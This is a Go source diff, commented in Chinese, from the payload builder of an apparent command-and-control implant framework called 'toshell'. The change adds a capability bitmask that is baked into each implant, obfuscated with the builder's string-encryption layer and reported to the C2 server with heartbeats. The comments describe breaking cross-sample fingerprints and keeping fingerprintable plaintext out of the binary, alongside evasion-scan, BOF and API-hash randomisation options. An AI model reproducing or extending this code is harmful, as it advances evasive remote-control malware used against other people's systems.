@@ -19,6 +19,7 @@ import (
 	"time"
 
 	donut "github.com/Binject/go-donut/donut"
+	"toshell/internal/common/features"
 	"toshell/internal/server/config"
 	"toshell/internal/server/logging"
 )
@@ -797,7 +798,10 @@ func buildTagList(transport, profile string, evasionScan, bof bool) string {
 	case "mqtt":
 		tags = append(tags, "transport_mqtt")
 	}
-	if profile == "light" {
+	// 档案收敛到唯一口径：未知档案（"nano"/拼错的名字）fail-closed 归入 light。
+	// 必须与 features.Derive 用同一个 NormalizeProfile，否则会出现
+	// "编了 full、界面按最小集显示"（或反过来）—— 正是 S4 要根除的分叉。
+	if features.NormalizeProfile(profile) == features.ProfileLight {
 		tags = append(tags, "light")
 	}
 	if evasionScan {
@@ -807,6 +811,34 @@ func buildTagList(transport, profile string, evasionScan, bof bool) string {
 		tags = append(tags, "bof")
 	}
 	return strings.Join(tags, " ")
+}
+
+// capabilityInput 把构建选项映射成能力推导入参（features.Input）。
+//
+// 只挑"真的决定编译内容"的字段；OS/Arch 的空值按 compile() 的默认值收敛
+// （windows/amd64），保证这里算出的位图与真正编译出的载荷一致。
+func capabilityInput(opts *BuildOptions) features.Input {
+	targetOS := opts.OS
+	if targetOS == "" {
+		targetOS = "windows"
+	}
+	arch := opts.Arch
+	if arch == "" {
+		arch = "amd64"
+	}
+	transport := opts.Transport
+	if transport == "" {
+		transport = transportForProtocol(opts.Protocol)
+	}
+	return features.Input{
+		Profile:     opts.Profile,
+		Transport:   transport,
+		Protocol:    opts.Protocol,
+		BOF:         opts.BofEnabled,
+		EvasionScan: opts.EvasionScan,
+		OS:          targetOS,
+		Arch:        arch,
+	}
 }
 
 func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, transport string, profile string, evasionScan, bof bool) ([]byte, error) {
@@ -832,7 +864,7 @@ func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, t
 		_ = os.Remove(filepath.Join(tmpDir, "transport_tls_std.go"))
 		_ = os.Remove(filepath.Join(tmpDir, "transport_tls_utls.go"))
 		logging.Debug("builder", "tcp profile: removed TLS client impl files (stdlib net/http not needed)")
-	} else if profile == "light" {
+	} else if features.NormalizeProfile(profile) == features.ProfileLight {
 		if err := os.Remove(filepath.Join(tmpDir, "transport_tls_utls.go")); err == nil {
 			logging.Debug("builder", "light profile: removed transport_tls_utls.go (stdlib TLS)")
 		}
@@ -1146,8 +1178,20 @@ func xorBlockKeyAtKey(b []byte, startOff int, key []byte) []byte {
 // （P0-1：打破跨样本同指纹）。必须在 obfuscateImplantSources 之前调用：
 //   - main.go 的 configBlockMagic：明文改成随机值，之后字符串混淆器会按固定 xd 基准
 //     把它再加密（不同明文→不同密文）；植入端运行时 xd 解出新值，与服务端写块一致。
+//   - main.go 的 capabilityToken（v1.4.0 S4）：把"本构建真的编译进去了哪些能力"的
+//     版本化位图令牌烘进载荷，运行期随心跳上报，C2 用它决定控制台显示哪些面板。
+//     同样是明文注入 → 混淆成 xd("hex")，二进制里不留下能力清单明文。
 //   - obfuscate.go 的 blockKey：obfuscate.go 被混淆器跳过，原样进二进制，可安全持有注入值。
 func (b *Builder) injectBuildConstants(tmpDir string, opts *BuildOptions) error {
+	// 能力位图（v1.4.0 S4）：先算好，"真的编译进去了什么"就是这一步的结论。
+	capInput := capabilityInput(opts)
+	capabilities := features.Derive(capInput)
+	// 能力位是"控制台显示什么"的唯一依据，烘焙结果必须留痕：
+	// 「这个载荷为什么没有注入面板」的第一现场就是这行日志。
+	logging.Info("builder", "capabilities baked: profile=%s os=%s bof=%v mask=0x%016X features=%s",
+		features.NormalizeProfile(capInput.Profile), capInput.OS, capInput.BOF,
+		features.Bitmask(capabilities), strings.Join(capabilities, ","))
+
 	// obfuscate.go（解码层，被跳过不混淆）
 	if data, err := os.ReadFile(filepath.Join(tmpDir, "obfuscate.go")); err == nil {
 		content := string(data)
@@ -1159,11 +1203,20 @@ func (b *Builder) injectBuildConstants(tmpDir string, opts *BuildOptions) error 
 			fmt.Sprintf("var xdBase byte = 0x%02X", opts.XfBase))
 		_ = os.WriteFile(filepath.Join(tmpDir, "obfuscate.go"), []byte(content), 0644)
 	}
-	// main.go（configBlockMagic 明文；obfuscate 会再混淆它，但明文不同 → 密文不同）
+	// main.go（configBlockMagic 明文 + 能力位令牌；obfuscate 会再混淆它们，
+	// 但明文不同 → 密文不同）
 	if data, err := os.ReadFile(filepath.Join(tmpDir, "main.go")); err == nil {
 		content := strings.ReplaceAll(string(data),
 			`var configBlockMagic = "TOSHELL_CFG_V1:"`,
 			fmt.Sprintf(`var configBlockMagic = %q`, opts.CfgMagic))
+		// 能力位图（v1.4.0 S4）：把"本次构建真的编译进去了哪些能力"烘进载荷，
+		// 让"界面上的按钮"有据可依。与 configBlockMagic 同样的两层处理 ——
+		// 这里注入明文令牌，紧接着 obfuscateImplantSources 会把它加密成 xd("hex")，
+		// 二进制里不保留能力清单明文（能力清单本身就是指纹）；
+		// 运行期 xd 解出令牌，随心跳 Modules 上报，C2 用同一个 features 包解码。
+		content = strings.ReplaceAll(content,
+			`var capabilityToken = "cap:v1:0000000000000000"`,
+			fmt.Sprintf(`var capabilityToken = %q`, features.EncodeToken(capInput)))
 		_ = os.WriteFile(filepath.Join(tmpDir, "main.go"), []byte(content), 0644)
 	}
 	// apihash_windows.go（FNF-1a 种子/乘子随机化）
